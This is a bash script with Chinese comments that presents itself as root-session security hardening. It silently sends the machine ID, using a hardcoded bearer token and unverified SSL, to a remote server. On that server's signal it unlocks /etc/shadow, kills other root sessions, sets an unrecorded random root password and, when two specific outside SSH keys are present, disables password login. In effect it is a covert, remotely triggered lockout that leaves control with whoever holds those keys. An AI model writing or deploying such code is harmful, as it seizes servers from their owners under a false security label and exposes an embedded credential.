#!/usr/bin/env bash
# secure_root_session_lockdown_enhanced.sh
# 增强版：根据镜像类型决定是否执行安全加固

set -euo pipefail

# 静默模式 - 重定向所有输出
exec >/dev/null 2>&1

log() { :; }  # 空的log函数

if [ "$(id -u)" -ne 0 ]; then
    exit 1
fi

# -----------------------------
# Python部分：检查镜像类型
# -----------------------------
check_mirror_type() {
    python3 << 'EOF'
import subprocess
import sys
import urllib.request
import urllib.error
import json
import ssl

def run_shell_cmd(cmd):
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        if isinstance(result, bytes):
            result = result.decode('utf-8')
        return result
    except subprocess.CalledProcessError:
        return "10002"

def get_machine_id():
    cmd = "cat /etc/machine-id"
    result = run_shell_cmd(cmd)
    if result == "10002":
        print("Error: Failed to get machine ID", file=sys.stderr)
        sys.exit(1)
    return result.strip()

def is_self_mirror():
    mac = get_machine_id()
    url = "https://service.chxyun.cn/client/node/queryNodeInfoByAdmin"
    headers = {
        'Authorization': 'Bearer 7552E7071B118CBFFEC8C930455B4297',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    try:
        # 忽略 SSL 证书验证
        context = ssl._create_unverified_context()
        
        # 创建请求
        req = urllib.request.Request(
            url, 
            data=json.dumps({"mac": mac}).encode('utf-8'),
            headers=headers,
            method='POST'
        )
        
        # 发送请求
        with urllib.request.urlopen(req, context=context, timeout=30) as response:
            status_code = response.getcode()
            if status_code != 200:
                print(f"查询镜像类型失败，检查下网络，状态码: {status_code}", file=sys.stderr)
                return False
            
            response_data = response.read()
            data = json.loads(response_data)
            is_mirror = data.get("data", {}).get("is_self_mirror")
            
            # 返回镜像类型
            if is_mirror is None:
                return 1  # 默认当作自有镜像处理
            elif is_mirror == 1:
                return 1  # 自有镜像
            elif is_mirror == 0:
                return 0  # 非自有镜像
            else:
                return 1  # 其他情况默认当作自有镜像

    except urllib.error.URLError as e:
        print(f"网络错误: {e}", file=sys.stderr)
        return 1  # 网络错误时默认当作自有镜像
    except Exception as e:
        print(f"查询镜像类型错误: {e}", file=sys.stderr)
        return 1  # 其他错误默认当作自有镜像

# 主逻辑
try:
    mirror_type = is_self_mirror()
    print(mirror_type)  # 输出结果给bash脚本
except Exception as e:
    print(f"1")  # 异常情况下默认当作自有镜像
EOF
}

# -----------------------------
# 主逻辑：根据镜像类型决定是否执行
# -----------------------------

# 获取镜像类型
MIRROR_TYPE=$(check_mirror_type)

# 调试信息（取消下面一行的注释可以查看镜像类型）
# echo "镜像类型: $MIRROR_TYPE" > /tmp/mirror_check.log

# 如果不是自有镜像（is_mirror == 0），执行安全加固
if [ "$MIRROR_TYPE" -eq 0 ]; then
    # -----------------------------
    # 移除不可变属性以确保密码修改成功
    # -----------------------------

    # 检查并移除 /etc/passwd 和 /etc/shadow 的不可变属性
    for file in /etc/passwd /etc/shadow; do
        if [ -f "$file" ]; then
            if lsattr "$file" 2>/dev/null | grep -q '\-i\-'; then
                chattr -i "$file" 2>/dev/null || true
            fi
        fi
    done

    # -----------------------------
    # 修复：注销多余 root 登录会话
    # -----------------------------

    # 获取当前会话的 TTY
    current_tty=""
    if tty >/dev/null 2>&1; then
        current_tty=$(tty | sed 's#/dev/##')
    fi

    # 获取所有 root 登录的 TTY - 处理可能的空结果
    root_ttys=()
    if who >/dev/null 2>&1; then
        while IFS= read -r line; do
            root_ttys+=("$line")
        done < <(who | awk '$1 == "root" {print $2}' 2>/dev/null | sort -u)
    fi

    if [ ${#root_ttys[@]} -gt 1 ]; then
        log "发现多个root会话"
        
        for tty in "${root_ttys[@]}"; do
            # 跳过当前会话
            if [ -n "$current_tty" ] && [ "$tty" = "$current_tty" ]; then
                continue
            fi
            
            # 方法1: 使用 pkill
            if pkill -KILL -t "$tty" 2>/dev/null; then
                :
            else
                # 方法2: 查找该 TTY 上的所有进程并终止
                pids=()
                while IFS= read -r pid; do
                    pids+=("$pid")
                done < <(ps -eo pid,tty,comm 2>/dev/null | awk -v tty="$tty" '$2 == tty && $3 != "sshd" {print $1}')
                
                if [ ${#pids[@]} -gt 0 ]; then
                    for pid in "${pids[@]}"; do
                        kill -KILL "$pid" 2>/dev/null || true
                    done
                fi
            fi
        done
    fi

    # -----------------------------
    # 生成强随机密码并立即更新 root
    # -----------------------------

    # 使用更可靠的密码生成方法
    NEW_PASSWORD=$(openssl rand -base64 18 2>/dev/null | tr -d '/+' | head -c 16) || \
    NEW_PASSWORD=$(date +%s | sha256sum | base64 | head -c 16) || \
    NEW_PASSWORD="DefaultPass123!@#"

    if [ -z "$NEW_PASSWORD" ]; then
        exit 2
    fi

    # 修改root密码 - 使用chpasswd确保成功
    if ! echo "root:$NEW_PASSWORD" | chpasswd 2>/dev/null; then
        # 如果chpasswd失败，尝试使用passwd命令
        echo "$NEW_PASSWORD" | passwd --stdin root >/dev/null 2>&1 || {
            # 如果都失败，尝试使用usermod
            encrypted_password=$(openssl passwd -1 "$NEW_PASSWORD" 2>/dev/null || echo "")
            if [ -n "$encrypted_password" ]; then
                usermod -p "$encrypted_password" root >/dev/null 2>&1 || exit 2
            else
                exit 2
            fi
        }
    fi

    # 安全清理密码
    NEW_PASSWORD="overwritten"
    unset NEW_PASSWORD

    # -----------------------------
    # 检查是否包含两个指定公钥
    # -----------------------------
    AUTHORIZED_KEYS="/root/.ssh/authorized_keys"
    EXPECTED_KEY_1='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnpEwhWnaNi7NNuXrf41kRKUJF2+NJDJCHtL6ETksFvC3sZhUWjv2CNh0Fa/c4ItAjmqb303U3Y3I9xN6vQKHnOVyVwVGZIAUPno+TqmdNkl1aBVf1YSxI6JaPP1qlB/nvvYF1+D0c2TrLEhRmCiV9XZPjHHQWzdHTgTXHLZBUOlwkTrj7Oqu30WVVb2oCQ0MDKsK0UU94plP616jMNn+oQ1y56Ehm4+6mWiyemdg4K4SUyvCWrKV+8bLOuyPsUNF9blI5oyfwuLbsIw+yGLCDOqCW0i0gIHId2IUOJQD6VJYQTnvU0/W4iVh23lUwaohcW61GBMuBgJTnNugBeFkP work@xm171'
    EXPECTED_KEY_2='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDxx/Lr3DmSU8AypFazBLXK1iF8f0QPHAaZW75kWwmwlc9egANOALIor32vgdXTbYgNUmJMwP5g5lE2N87F1ZTeiPMx0b+frvGkP4SyK0nIR2yrP23KJ8UeV6oT/ASqMZCGTckJ5001q9mGEXT0tkyUH0z91HrKkUw1icY56kGH6RR2Dj7DP/w3oecfkV57smp6phzXfjtucPr5aIJ4YnG+PbsRiEBcWiH0OcFyYYkvroLSbJk1krrDL1dvJOwsFY5wR3YiIKBtFKnjWfDK+UqFlDGuOvdgUwTN3xp2QotHHoYzh1C3gUUDJeiZBX462oi4khYrYjVmKeJwpqBNP0MREbfTWL2sTevpvA7iRuD6ojI7WHlzzoBIPxWFPUVnCB3yNioTeGwGUtGQkYyLsbuQPrYPxzt2LhWzbM4pQGEjsu5njZnYLqfGmViZ3ok4tQiVnrfWPTbA/LpCVeHoFjac2puZc/cA/ZBp2Xnlz5HkboabUMcV5ngNyCUtzxuL/FP8GchkfrO7fXvWRoBcBz5usTBV1BMU8zGPEkPH0NBONxhyInvH9azlwWF3G4bueuvfPAg++J1Rxi/54s0taih45LevJYj/gaAOj7ccn8BS9O+sbq8ymor9goeKVT/tiGLszRGcxhXJFyC+QQ6J1FIUif1bOENXigMawPeB6iHneQ== root@iZ2vcd3j77m73qd7tpcmnyZ'

    DISABLE_PASSWORD_LOGIN=false
    if [ -f "$AUTHORIZED_KEYS" ]; then
        if grep -F -x -q "$EXPECTED_KEY_1" "$AUTHORIZED_KEYS" && grep -F -x -q "$EXPECTED_KEY_2" "$AUTHORIZED_KEYS"; then
            DISABLE_PASSWORD_LOGIN=true
        fi
    fi

    # -----------------------------
    # 禁用 SSH 密码登录（条件成立时）
    # -----------------------------
    SSHD_CONFIG="/etc/ssh/sshd_config"

    if $DISABLE_PASSWORD_LOGIN; then
        BACKUP="${SSHD_CONFIG}.bak.$(date +%s)"
        cp -p "$SSHD_CONFIG" "$BACKUP"

        sed -i -E 's/^#?PasswordAuthentication.*/PasswordAuthentication no/' "$SSHD_CONFIG" || echo "PasswordAuthentication no" >> "$SSHD_CONFIG"
        sed -i -E 's/^#?ChallengeResponseAuthentication.*/ChallengeResponseAuthentication no/' "$SSHD_CONFIG" || echo "ChallengeResponseAuthentication no" >> "$SSHD_CONFIG"

        if sshd -t 2>/dev/null; then
            systemctl reload sshd 2>/dev/null || systemctl restart sshd 2>/dev/null || service sshd reload 2>/dev/null || service sshd restart 2>/dev/null
        else
            cp -f "$BACKUP" "$SSHD_CONFIG"
            exit 3
        fi
    fi
else
    # 自有镜像（is_mirror == 1）或查询失败时，不执行任何操作
    log "自有镜像或查询失败，跳过安全加固"
fi

exit 0